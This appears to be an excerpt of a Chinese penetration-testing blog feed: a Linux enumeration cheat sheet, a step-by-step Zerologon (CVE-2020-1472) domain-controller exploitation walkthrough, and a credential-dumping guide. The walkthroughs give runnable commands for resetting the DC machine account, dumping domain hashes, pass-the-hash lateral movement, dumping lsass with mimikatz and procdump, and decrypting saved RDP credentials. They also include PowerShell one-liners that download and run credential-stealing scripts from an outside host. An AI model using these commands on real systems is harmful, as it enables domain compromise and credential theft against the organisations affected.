+<h4 id="8-文件系统"><a href="#8-文件系统" class="headerlink" title="8 - 文件系统"></a>8 - 文件系统</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/profile		// /etc/profile 包含Linux系统环境和启动程序。 它被所有的用户使</span><br><span class="line">			  	   用于bash，ksh，sh shell。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/bashrc			// /etc/bashrc或者/etc/bash.bashrc是全系统的bash每个交互式</span><br><span class="line">			  	   shell启动文件。是使用系统广泛的功能和别名。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> ~/.bash_profile		// 类似 /etc/profile, 但仅适用于当前用户</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> ~/.bash_history		//  打印当前用户bash命令的历史记录</span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> <span class="literal">-al</span> /var/log/		// 列出所有日志文件</span><br><span class="line"></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-1000</span> <span class="literal">-type</span> d <span class="number">2</span>&gt;/dev/null	// 粘滞位 - 只有目录的所有者或文件的所有者可以在这里删</span><br><span class="line">			  		   除或重命名.</span><br><span class="line"></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-g</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null	// SGID（chmod <span class="number">2000</span>）-作为组运行，而不是启动它的用户。</span><br><span class="line"></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null	// SUID（chmod <span class="number">4000</span>）-作为所有者运行，而不是启动它的用户。</span><br><span class="line"></span><br><span class="line">find / ( <span class="literal">-perm</span> <span class="literal">-o</span> w <span class="literal">-perm</span> <span class="literal">-o</span> x ) <span class="literal">-type</span> d <span class="number">2</span>&gt;/dev/null		// 找出可写可执行的文件夹</span><br><span class="line"></span><br><span class="line">find / <span class="literal">-xdev</span> <span class="literal">-type</span> d ( <span class="literal">-perm</span> <span class="literal">-0002</span> <span class="literal">-a</span> ! <span class="literal">-perm</span> <span class="literal">-1000</span>) <span class="literal">-print</span>	// 找出可写的文件</span><br><span class="line"></span><br><span class="line">find /<span class="built_in">dir</span> <span class="literal">-xdev</span> ( <span class="literal">-nouser</span> <span class="literal">-o</span> <span class="literal">-nogroup</span> ) <span class="literal">-print</span>			// 找出不是所有者的文件</span><br></pre></td></tr></table></figure>
+
+<h4 id="9-计划用户-crontab"><a href="#9-计划用户-crontab" class="headerlink" title="9 - 计划用户 - crontab"></a>9 - 计划用户 - crontab</h4><p>crond是linux下用来周期性的执行某种任务或等待处理某些事件的一个守护进程，当安装完成操作系统后，默认会 安装此服务 工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行 的任务，则自动执行该任务。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">crontab <span class="literal">-l</span> 				//显示当前用户crontab</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">crontab [-<span class="type">u</span> <span class="type">username</span>] [-<span class="type">l</span>|-<span class="type">e</span>|-<span class="type">r</span>]</span><br><span class="line">参数：</span><br><span class="line"></span><br><span class="line"><span class="literal">-u</span>: 只有root才能进行这个任务，也即帮其他用户新建/删除crontab工作调度;</span><br><span class="line"></span><br><span class="line"><span class="literal">-e</span>: 编辑crontab 的工作内容;</span><br><span class="line"></span><br><span class="line"><span class="literal">-l</span>: 查阅crontab的工作内容;</span><br><span class="line"></span><br><span class="line"><span class="literal">-r</span>: 删除所有的crontab的工作内容，若仅要删除一项，请用<span class="literal">-e</span>去编辑。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>    <span class="number">12</span>   *   *   *    root /etc/init.d/smb restart</span><br><span class="line"><span class="comment">#分  时   日   月  周  |《==============命令行=======》|</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>代表意义</th>
+<th>分钟</th>
+<th>小时</th>
+<th>日期</th>
+<th>月份</th>
+<th>周</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>范围</td>
+<td>0-59</td>
+<td>0-23</td>
+<td>1-31</td>
+<td>1-12</td>
+<td>0-7</td>
+<td></td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2020-1472 Netlogon域权限提升漏洞</title>
+    <url>/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="CVE-2020-1472-Netlogon域权限提升漏洞"><a href="#CVE-2020-1472-Netlogon域权限提升漏洞" class="headerlink" title="CVE-2020-1472 Netlogon域权限提升漏洞"></a>CVE-2020-1472 Netlogon域权限提升漏洞</h1><h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-漏洞信息"><a href="#0x00-漏洞信息" class="headerlink" title="0x00 漏洞信息"></a>0x00 漏洞信息</h3><p><strong>漏洞编号：</strong>CVE-2020-1472</p>
+<p><strong>漏洞名称：</strong>Netlogon域权限提升</p>
+<p><strong>漏洞描述：</strong>2020年08月12日， 微软官方发布了 NetLogon 特权提升漏洞 的风险通告。攻击者通过NetLogon（MS-NRPC）， 建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中 的设备上运行经特殊设计的应用程序。</p>
+<p><strong>影响版本：</strong></p>
+<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1 </p>
+<p>Windows Server 2012 </p>
+<p>Windows Server 2016 </p>
+<p>Windows Server 2019 </p>
+<p>Windows Server, version 1903 (Server Core installation) </p>
+<p>Windows Server, version 1909 (Server Core installation) </p>
+<p>Windows Server, version 2004 (Server Core installation)</p>
+<span id="more"></span>
+
+<h3 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h3><p>环境：DC</p>
+<p>IP    ： 192.168.31.78 /10.10.10.10</p>
+<ol>
+<li><h6 id="查看域控主机名称"><a href="#查看域控主机名称" class="headerlink" title="查看域控主机名称"></a>查看域控主机名称</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/1.png"></p>
+<ol start="2">
+<li><h6 id="检测漏洞是否存在"><a href="#检测漏洞是否存在" class="headerlink" title="检测漏洞是否存在"></a>检测漏洞是否存在</h6></li>
+</ol>
+<blockquote>
+<p><a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 zerologon_tester.py DC <span class="number">192.168</span>.<span class="number">31.78</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/2.png"></p>
+<ol start="3">
+<li><h6 id="漏洞利用，重置域账号的哈希"><a href="#漏洞利用，重置域账号的哈希" class="headerlink" title="漏洞利用，重置域账号的哈希"></a>漏洞利用，重置域账号的哈希</h6></li>
+</ol>
+<blockquote>
+<p><a href="https://github.com/blackarrowsec/redteam-research">https://github.com/blackarrowsec/redteam-research</a></p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python CVE<span class="literal">-2020</span><span class="literal">-1472</span>.py DC DC<span class="variable">$</span> <span class="number">192.168</span>.<span class="number">31.78</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/3.png"></p>
+<ol start="4">
+<li><h6 id="获取域控用户hash"><a href="#获取域控用户hash" class="headerlink" title="获取域控用户hash"></a>获取域控用户hash</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py <span class="string">&#x27;de1ay.com/DC$@192.168.123.136&#x27;</span> <span class="literal">-no</span><span class="literal">-pass</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/4.png"></p>
+<ol start="5">
+<li><h6 id="wmiexec进行hash横向连接"><a href="#wmiexec进行hash横向连接" class="headerlink" title="wmiexec进行hash横向连接"></a>wmiexec进行hash横向连接</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python wmiexec.py <span class="literal">-hashes</span> aad3b435b51404eeaad3b435b51404ee:<span class="number">3</span>b24c391862f4a8531a245a0217708c4 DC<span class="variable">$</span>/Administrator@<span class="number">192.168</span>.<span class="number">31.78</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/5.png"></p>
+<ol start="6">
+<li><h6 id="恢复域-获取hash"><a href="#恢复域-获取hash" class="headerlink" title="恢复域 - 获取hash"></a>恢复域 - 获取hash</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取sam数据库</span></span><br><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">get system.save</span><br><span class="line">get sam.save</span><br><span class="line">get security.save</span><br><span class="line"><span class="built_in">del</span> /f system.save</span><br><span class="line"><span class="built_in">del</span> /f sam.save</span><br><span class="line"><span class="built_in">del</span> /f security.sav</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li><h6 id="恢复域-获取hash-1"><a href="#恢复域-获取hash-1" class="headerlink" title="恢复域 - 获取hash"></a>恢复域 - 获取hash</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取hash</span></span><br><span class="line">python secretsdump.py <span class="literal">-sam</span> sam.save <span class="literal">-system</span> system.save <span class="literal">-security</span> security.save LOCAL</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/6.png"></p>
+<ol start="8">
+<li><h6 id="恢复域"><a href="#恢复域" class="headerlink" title="恢复域"></a>恢复域</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python reinstall_original_pw.py DC <span class="number">192.168</span>.<span class="number">31.78</span> f2b1b4d01ab6f44f28634a765bc53836</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/7.png"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows密码凭证获取</title>
+    <url>/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
+    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Windows-Hash简介"><a href="#0x00-Windows-Hash简介" class="headerlink" title="0x00  Windows Hash简介"></a>0x00  Windows Hash简介</h3><h4 id="Windows-Hash"><a href="#Windows-Hash" class="headerlink" title="Windows Hash"></a>Windows Hash</h4><p>所谓哈希（hash），就是使用一种加密函数进行计算后的结果。这个加密函数对一个任意长度的字符串数据进行一 次数学加密函数运算，然后返回一个固定长度的字符串。 现在已经有了更新的NTLMv2以及Kerberos验证体系。</p>
+<p>Windows系统使用两种方法对用户的密码进行哈希处理，它们分别是LAN Manager（LM）哈希和NT LAN Manager（NTLM）哈希Windows加密过的密码口令，我们称之为hash，Windows的系统密码hash默认情况下一般由两部分组成：第一 部分是LM-hash，第二部分是NTLM-hash。</p>
+<span id="more"></span>
+
+<p>Windows Hash格式：</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">用户名称<span class="symbol">:RID</span><span class="symbol">:LM-HASH</span>值<span class="symbol">:NT-HASH</span>值</span><br></pre></td></tr></table></figure>
+
+<p>LM哈希密码最大长度为14，密码长度超过14位使用NTLM哈希</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>2000</th>
+<th>xp</th>
+<th>2003</th>
+<th>Vista</th>
+<th>win7</th>
+<th>2008</th>
+<th>2012</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LM</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>NTLM</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+</tbody></table>
+<h4 id="Windows-认证基础"><a href="#Windows-认证基础" class="headerlink" title="Windows 认证基础"></a>Windows 认证基础</h4><p>Windows的认证包括三个部分： </p>
+<ul>
+<li><p>本地认证：用户直接操作计算机登陆账户 </p>
+</li>
+<li><p>网络认证：远程连接到工作组中的某个设备 </p>
+</li>
+<li><p>域认证：登陆到域环境中的某个设备</p>
+</li>
+</ul>
+<h4 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h4><ul>
+<li><p>用户输入密码 </p>
+</li>
+<li><p>系统收到密码后将用户输入的密码计算成NTLM Hash </p>
+</li>
+<li><p>与sam数据库（%SystemRoot%\system32\config\sam）中该用户的哈希比对 </p>
+</li>
+<li><p>匹配则登陆成功，不匹配则登陆失败</p>
+</li>
+</ul>
+<p>本地认证中用来处理用户输入密码的进程为lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对，我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的</p>
+<h3 id="0x01-系统用户密码凭证获取"><a href="#0x01-系统用户密码凭证获取" class="headerlink" title="0x01 系统用户密码凭证获取"></a>0x01 系统用户密码凭证获取</h3><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><blockquote>
+<p><a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
+</blockquote>
+<h6 id="本地交互式"><a href="#本地交互式" class="headerlink" title="本地交互式"></a>本地交互式</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">mimikatz # log res.txt</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # token::elevate</span><br><span class="line">mimikatz # lsadump::sam</span><br><span class="line">mimikatz # <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="本地非交互式凭证获取"><a href="#本地非交互式凭证获取" class="headerlink" title="本地非交互式凭证获取"></a>本地非交互式凭证获取</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">mimikatz # log logon.txt</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line">mimikatz # <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="Powershell远程加载mimikatz脚本"><a href="#Powershell远程加载mimikatz脚本" class="headerlink" title="Powershell远程加载mimikatz脚本"></a>Powershell远程加载mimikatz脚本</h6><blockquote>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1">https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1</a></p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;http://ip:prot/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz –DumpCreds</span><br></pre></td></tr></table></figure>
+
+<h6 id="Powershell加载Get-PassHashes脚本"><a href="#Powershell加载Get-PassHashes脚本" class="headerlink" title="Powershell加载Get-PassHashes脚本"></a>Powershell加载Get-PassHashes脚本</h6><blockquote>
+<p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX(new-object <span class="built_in">net</span>.webclient).downloadstring(&#x27;http://<span class="number">47</span>.x.x.<span class="number">85</span>/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure>
+
+<h4 id="WCE"><a href="#WCE" class="headerlink" title="WCE"></a>WCE</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">官网地址：https:<span class="regexp">//</span>www.ampliasecurity.com/research.html</span><br><span class="line"><span class="number">32</span>位下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>wce_v1_42beta_x32.zip</span><br><span class="line"><span class="number">64</span>位下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>wce_v1_42beta_x64.zip</span><br><span class="line">历史版本下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>windows-credentials-editor/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/1.jpg"></p>
+<h4 id="Pwddump7"><a href="#Pwddump7" class="headerlink" title="Pwddump7"></a>Pwddump7</h4><p>这款工具可以读取出当前系统的各个用户的密码hash (包括LM和NTLM)。 在命令行输入Pwddump7.txt就可以读取出hash并显示出来，也可以保存到一个文件中。</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Pwddump7</span>.</span></span>exe &gt; pass.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/2.jpg"></p>
+<h4 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h4><blockquote>
+<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum</a></p>
+</blockquote>
+<p>Procdump lsass 进程导出: </p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">For</span> <span class="number">32</span>bits：</span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp </span><br><span class="line"><span class="keyword">For</span> <span class="number">64</span>bits：</span><br><span class="line">procdump.exe -accepteula -<span class="number">64</span> -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p>然后使用mimikatz还原密码：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">sekurlsa::<span class="title">minidump</span> <span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonPasswords</span> <span class="title">full</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="注册表导出hash"><a href="#注册表导出hash" class="headerlink" title="注册表导出hash"></a>注册表导出hash</h4><blockquote>
+<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum</a></p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security.hiv</span><br></pre></td></tr></table></figure>
+
+<h6 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">lsadump::<span class="title">sam</span> /<span class="title">system:system</span>.<span class="title">hiv</span> /<span class="title">sam:sam</span>.<span class="title">hiv</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+
+<h6 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure>
+
+<h4 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h4><blockquote>
+<p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
+</blockquote>
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/3.jpg"></p>
+<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><h6 id="Hashdump"><a href="#Hashdump" class="headerlink" title="Hashdump"></a>Hashdump</h6><p>获取system权限</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">meterpreter</span> &gt; getsystem</span><br><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
+
+<p>获取hash值</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/hashdump		//system权限的meterpreter</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">exploit						//结果保存在tmp目录下</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/smart_hashdump</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h6 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; <span class="built_in">help</span> kiwi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#列举系统中的明文密码</span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">#读取sam文件</span><br><span class="line">meterpreter &gt; lsa_dump_sam</span><br><span class="line">#kiwi_cmd命令后面接mimikatz.exe的命令</span><br><span class="line">meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">beacon&gt; logonpasswords</span><br><span class="line">beacon&gt; mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-Hash解密"><a href="#0x02-Hash解密" class="headerlink" title="0x02  Hash解密"></a>0x02  Hash解密</h3><blockquote>
+<p><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p>
+</blockquote>
+<h6 id="Ophcrack"><a href="#Ophcrack" class="headerlink" title="Ophcrack"></a>Ophcrack</h6><p>如果网站无法破解出hash值，可以使用ophcrack工具配合彩虹表破解。 </p>
+<p>工具下载：<a href="https://ophcrack.sourceforge.io/">https://ophcrack.sourceforge.io/</a> </p>
+<p>彩虹表： <a href="https://ophcrack.sourceforge.io/tables.php">https://ophcrack.sourceforge.io/tables.php</a> <a href="http://project-rainbowcrack.com/table.htm">http://project-rainbowcrack.com/table.htm</a></p>
+<h3 id="0x03-其他密码获取"><a href="#0x03-其他密码获取" class="headerlink" title="0x03  其他密码获取"></a>0x03  其他密码获取</h3><h4 id="获取RDP连接密码"><a href="#获取RDP连接密码" class="headerlink" title="获取RDP连接密码"></a>获取RDP连接密码</h4><h6 id="获取链接记录"><a href="#获取链接记录" class="headerlink" title="获取链接记录"></a>获取链接记录</h6><blockquote>
+<p><a href="https://github.com/3gstudent/List-RDP-Connections-History.git">https://github.com/3gstudent/List-RDP-Connections-History.git</a></p>
+</blockquote>
+<h6 id="mimikatz解密"><a href="#mimikatz解密" class="headerlink" title="mimikatz解密"></a>mimikatz解密</h6><p>查看本地机器本地连接过的目标机器：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/4.jpg"></p>
+<p>查看本地用户此目录下是否存有RDP密码文件：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a <span class="variable">%userprofile%</span>\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/5.jpg"></p>
+<p>查看保存在本地的远程主机信息：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>
+
+<p>选择一个密码文件对其进行解密：</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">dpapi::cred</span><br><span class="line">/in:C:<span class="symbol">\U</span>sers<span class="symbol">\4</span>600<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\D</span>FBE70A7E5CC19A398EBF1B96859CE5D</span><br></pre></td></tr></table></figure>
+
+<p>此处需要记录下<code>guidMasterKey</code>的值，待会要通过<code>guidMasterKey</code>找对应的<code>Masterkey</code>。</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">guidMasterKey : &#123;<span class="number">56</span>dc62ge-<span class="number">0</span>af9-<span class="number">4925</span>-bf07-f54ba502a40a&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据guidMasterKey找到对应的Masterkey：</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure>
+
+<p>通过Masterkey解密pbData数据，拿到明文RDP连接密码：</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">dpapi::cred</span><br><span class="line">/in:C:<span class="symbol">\U</span>sers<span class="symbol">\4</span>600<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\2</span>A203AFB09B575A760E88FA341B9E354</span><br><span class="line">/masterkey:2d72835b9c08a9332106c23017ee6c0a0be9a368de34c1f6acc6d34dc0de8bc264729bd7736</span><br><span class="line">f806e9456544841564be0d5e9564090a7bb143ac32579adabb02a</span><br></pre></td></tr></table></figure>
+
+<h4 id="Mysql数据库密码破解"><a href="#Mysql数据库密码破解" class="headerlink" title="Mysql数据库密码破解"></a>Mysql数据库密码破解</h4><p>一旦获取了网站一定的权限后，如果能够获取MySQL中保存用户数据，通过解密后，即可通过正常途径来访问 数据库；一方面可以直接操作数据库中的数据，另一方面可以用来提升权限。 </p>
+<p>MySQL数据库用户密码跟其它数据库用户密码一样，在应用系统代码中都是以明文出现的，在获取文件读取权 限后即可直接从数据库连接文件中读取 一般都包含有数据库类型，物理位置，用户名和密码等信息</p>
+<h5 id="MYSQL数据库文件类型"><a href="#MYSQL数据库文件类型" class="headerlink" title="MYSQL数据库文件类型"></a>MYSQL数据库文件类型</h5><p>MYSQL数据库文件共有“frm”、“MYD”“和MYI”三种文件</p>
+<ul>
+<li>“.frm” 是描述表结构的文件 </li>
+<li>“.MYD” 是表的数据文件 </li>
+<li>“.MYI” 是表数据文件中任何索引的数据树</li>
+</ul>
+<p>与用户相关的一共有三个文件即user.frm、user.MYD、user.MYI，MYSQL数据库用户密码都保存在user.MYD 文件中，包括root用户和其他用户的密码</p>
+<h5 id="MYSQL加密方式"><a href="#MYSQL加密方式" class="headerlink" title="MYSQL加密方式"></a>MYSQL加密方式</h5><p>MYSQL数据库的认证密码有两种方式：</p>
+<ul>
+<li>MYSQL 4.1版本之前是MYSQL323加密 </li>
+<li>MYSQL 4.1和之后的版本都是MYSQLSHA1加密</li>
+</ul>
